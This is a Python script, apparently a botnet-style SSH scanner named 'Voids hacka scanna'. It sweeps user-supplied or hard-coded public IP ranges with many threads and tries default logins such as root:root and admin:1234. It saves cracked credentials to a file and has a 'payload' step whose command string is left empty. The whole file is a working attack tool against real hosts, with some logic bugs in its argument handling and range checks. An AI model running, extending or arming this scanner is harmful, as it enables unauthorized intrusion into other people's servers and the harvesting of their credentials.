# Voids hacka scanna
# nano /usr/include/bits/typesizes.h -> change 99999 to 99999
# ulimit -n 99999 
# python scan.py 1000 <start-range> <end-range>

import threading, paramiko, random, socket, time, sys

paramiko.util.log_to_file("/dev/null")

server_ip = "208.67.1.26"

blacklisted = ["127.0","10.0","192.168"]

passwords = ["admin:1234"]

if sys.argv[4] == "root":
    passwords = ["root:root"]
if sys.argv[4] == "guest":
    passwords = ["guest:guest"]
if sys.argv[4] == "telnet":
    passwords = ["telnet:telnet"]

if len(sys.argv) < 4:
    sys.exit("Usage: python " + sys.argv[0] + " <threads> <start-range> <end-range> <passwords>")

print """\n\x1b[0;37m******************************
*      \x1b[0;31mSCANNER STARTING\x1b[0;37m      *
******************************\x1b[0m"""

def sshscanner(ip):
    global passwords
    try:
        thisipisbad='no'
        for badip in blacklisted:
            if badip in ip:
                thisipisbad='yes'
        if thisipisbad=='yes':
            sys.exit()
        username='root'
        password="0"
        port = 22
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((ip, port))
        data = str(s.recv(99999))
        if "SSH" in data:
            print("\x1b[0;33m[-] SSH Open On -> " + ip + "\x1b[37m")
        elif "ssh" in data:
            print("\x1b[0;33m[-] SSH Open On -> " + ip + "\x1b[37m")
        else:
            sys.exit()
        s.close()
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        dobreak=False
        for passwd in passwords:
            if ":n/a" in passwd:
                password=""
            else:
                password=passwd.split(":")[1]
            if "n/a:" in passwd:
                username=""
            else:
                username=passwd.split(":")[0]
            try:
                ssh.connect(ip, port = port, username=username, password=password, timeout=3)
                break
            except:
                pass
        badserver=True
        stdin, stdout, stderr = ssh.exec_command("/sbin/ifconfig")
        output = stdout.read()
        if "inet addr" in output:
            badserver=False
        websites = [ ]			
        if badserver == False:
                print("\x1b[0;32m[+] Executing Payload -> " + ip + ":" + username + ":" + password + "\x1b[37m")
                ssh.exec_command("")
                vulns = open("vuln.txt", "a").write(username + ":" + password + ":" + ip + "\n")
                time.sleep(12)
                ssh.close()
    except Exception as e:
        pass


if sys.argv[2] == "LUCKY":
    ranges = ["122.3.0.0/122.3.255.255", "122.52.0.0/122.54.255.255", "124.83.0.0/124.83.255.255", "124.105.0.0/124.107.255.255"]
    randomrange = random.choice(ranges)
    startrng = randomrange.split("/")[0]
    endrng = randomrange.split("/")[1]

if sys.argv[2] != "LUCKY":
    a = int(sys.argv[2].split(".")[0])
    b = int(sys.argv[2].split(".")[1])
    c = int(sys.argv[2].split(".")[2])
    d = int(sys.argv[2].split(".")[3])
else:
    a = int(startrng.split(".")[0])
    b = int(startrng.split(".")[1])
    c = int(startrng.split(".")[2])
    d = int(startrng.split(".")[3])
x = 0

while(True):
    try:

        if sys.argv[2] != "LUCKY":
            endaddr = sys.argv[3]
        else:
            endaddr = endrng
        
        d += 1

        ipaddr = str(a) + "." + str(b) + "."+str(c)+"."+str(d)

        if endaddr == (ipaddr or str(a) + "." + str(b) + "."+str(c)+"."+str(d-1)):
            if sys.argv[2] == "LUCKY":
                randomrange = random.choice(ranges)
                startrng = randomrange.split("/")[0]
                endrng = randomrange.split("/")[1]
                a = int(startrng.split(".")[0])
                b = int(startrng.split(".")[1])
                c = int(startrng.split(".")[2])
                d = int(startrng.split(".")[3])
            else:
                break

        if d > 255:
            c += 1
            d = 0

        if c > 255:
            b += 1
            c = 0
        
        if b > 255:
            a += 1
            b = 0

        ipaddr = str(a) + "." + str(b) + "."+str(c)+"."+str(d)

        if ipaddr == endaddr:
            if sys.argv[2] == "LUCKY":
                randomrange = random.choice(ranges)
                startrng = randomrange.split("/")[0]
                endrng = randomrange.split("/")[1]
                a = int(startrng.split(".")[0])
                b = int(startrng.split(".")[1])
                c = int(startrng.split(".")[2])
                d = int(startrng.split(".")[3])
            else:
                break

        if x > 500:
            time.sleep(1)
            x = 0
        
        t = threading.Thread(target=sshscanner, args=(ipaddr,))
        t.start()
        
    except Exception as e:
        pass

print "\x1b[37mDone\x1b[37m"
